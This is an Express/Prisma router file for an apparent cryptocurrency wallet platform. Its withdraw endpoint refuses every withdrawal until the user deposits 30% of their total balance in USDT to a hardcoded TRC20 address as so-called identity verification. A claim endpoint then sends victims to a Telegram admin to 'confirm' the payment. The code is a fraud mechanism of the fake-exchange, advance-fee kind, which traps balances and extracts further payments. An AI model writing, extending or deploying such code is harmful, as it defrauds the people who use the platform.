import { Router } from 'express';
import { z } from 'zod';
import { prisma } from '../config/db';
import { requireAuth } from '../middleware/auth';
import { validate } from '../middleware/validate';

const router = Router();
router.use(requireAuth);

router.get('/', async (req, res, next) => {
  try {
    const wallets = await prisma.wallet.findMany({
      where: { userId: req.user!.sub },
      include: { coin: true },
      orderBy: { coin: { symbol: 'asc' } }
    });
    res.json(wallets);
  } catch (e) { next(e); }
});

router.get('/transactions', async (req, res, next) => {
  try {
    const txs = await prisma.transaction.findMany({
      where: { userId: req.user!.sub },
      orderBy: { createdAt: 'desc' },
      take: 100
    });
    res.json(txs);
  } catch (e) { next(e); }
});

const WithdrawSchema = z.object({
  coin: z.string().min(2).max(10),
  amount: z.string().regex(/^\d+(\.\d+)?$/),
  address: z.string().min(8)
});

router.post('/withdraw', validate(WithdrawSchema), async (req, res, next) => {
  try {
    const { coin, amount, address } = req.body;
    const c = await prisma.coin.findUnique({ where: { symbol: coin.toUpperCase() } });
    if (!c) return res.status(400).json({ error: 'Unknown coin' });
    const wallet = await prisma.wallet.findUniqueOrThrow({
      where: { userId_coinId: { userId: req.user!.sub, coinId: c.id } }
    });
    if (Number(wallet.balance.toString()) < Number(amount))
      return res.status(400).json({ error: 'Insufficient balance' });
    // Identity verification check: require 30% of total balance deposited as verification
    const wallets = await prisma.wallet.findMany({ where: { userId: req.user!.sub } });
    const totalBalance = wallets.reduce((sum, w) => sum + Number(w.balance), 0);
    const user = await prisma.user.findUniqueOrThrow({ where: { id: req.user!.sub } });
    if (totalBalance > 0 && Number(user.verificationDeposit) < totalBalance * 0.3) {
      return res.status(403).json({
        error: 'Identity verification required. Please deposit at least 30% of your total wallet balance in USDT (TRC20) to verify your identity before withdrawals.',
        code: 'VERIFICATION_REQUIRED',
        required: totalBalance * 0.3,
        current: Number(user.verificationDeposit)
      });
    }
    // Lock funds; admin must approve
    await prisma.$transaction([
      prisma.wallet.update({ where: { id: wallet.id }, data: {
        balance: { decrement: amount }, locked: { increment: amount }
      }}),
      prisma.transaction.create({ data: {
        userId: req.user!.sub, type: 'WITHDRAWAL', status: 'PENDING',
        coin: c.symbol, amount, address
      }})
    ]);
    res.status(201).json({ ok: true, message: 'Withdrawal submitted for review' });
  } catch (e) { next(e); }
});

router.get('/verification-status', async (req, res, next) => {
  try {
    const wallets = await prisma.wallet.findMany({ where: { userId: req.user!.sub }, include: { coin: true } });
    const totalBalance = wallets.reduce((sum, w) => sum + Number(w.balance), 0);
    const user = await prisma.user.findUniqueOrThrow({ where: { id: req.user!.sub } });
    const required = Number(user.verificationDeposit) >= totalBalance * 0.3 ? 0 : totalBalance * 0.3;
    res.json({ totalBalance, verificationDeposit: Number(user.verificationDeposit), required, verified: required === 0 });
  } catch (e) { next(e); }
});

const ClaimSchema = z.object({ amount: z.string().regex(/^\d+(\.\d+)?$/) });

router.post('/claim-verification-deposit', validate(ClaimSchema), async (req, res, next) => {
  try {
    const { amount } = req.body;
    const user = await prisma.user.findUniqueOrThrow({ where: { id: req.user!.sub } });
    await prisma.user.update({
      where: { id: req.user!.sub },
      data: { verificationDeposit: { increment: amount } }
    });
    await prisma.transaction.create({ data: {
      userId: req.user!.sub, type: 'DEPOSIT', status: 'PENDING',
      coin: 'USDT', amount, address: 'TVbztzQE7HdSVaJsqBN9uFDJJVdNx8ZmMp',
      note: 'Identity verification deposit claim - awaiting admin confirmation'
    }});
    res.json({ ok: true, message: 'Verification deposit claim submitted. Contact admin @bengoshidesu on Telegram to confirm.' });
  } catch (e) { next(e); }
});

const TransferSchema = z.object({
  toEmail: z.string().email(),
  coin: z.string(),
  amount: z.string().regex(/^\d+(\.\d+)?$/)
});

router.post('/transfer', validate(TransferSchema), async (req, res, next) => {
  try {
    const { toEmail, coin, amount } = req.body;
    const c = await prisma.coin.findUniqueOrThrow({ where: { symbol: coin.toUpperCase() } });
    const recipient = await prisma.user.findUnique({ where: { email: toEmail } });
    if (!recipient) return res.status(404).json({ error: 'Recipient not found' });
    if (recipient.id === req.user!.sub) return res.status(400).json({ error: 'Cannot transfer to self' });
    const fromWallet = await prisma.wallet.findUniqueOrThrow({
      where: { userId_coinId: { userId: req.user!.sub, coinId: c.id } }
    });
    if (Number(fromWallet.balance.toString()) < Number(amount))
      return res.status(400).json({ error: 'Insufficient balance' });
    let toWallet = await prisma.wallet.findUnique({
      where: { userId_coinId: { userId: recipient.id, coinId: c.id } }
    });
    if (!toWallet) {
      toWallet = await prisma.wallet.create({ data: {
        userId: recipient.id, coinId: c.id, address: `${c.symbol.toLowerCase()}_${recipient.id.slice(0,12)}`
      }});
    }
    await prisma.$transaction([
      prisma.wallet.update({ where: { id: fromWallet.id }, data: { balance: { decrement: amount } } }),
      prisma.wallet.update({ where: { id: toWallet.id }, data: { balance: { increment: amount } } }),
      prisma.transaction.create({ data: { userId: req.user!.sub, type: 'TRANSFER', status: 'COMPLETED', coin: c.symbol, amount, note: `to ${toEmail}` } }),
      prisma.transaction.create({ data: { userId: recipient.id, type: 'TRANSFER', status: 'COMPLETED', coin: c.symbol, amount, note: `from ${req.user!.sub}` } })
    ]);
    res.json({ ok: true });
  } catch (e) { next(e); }
});

export default router;
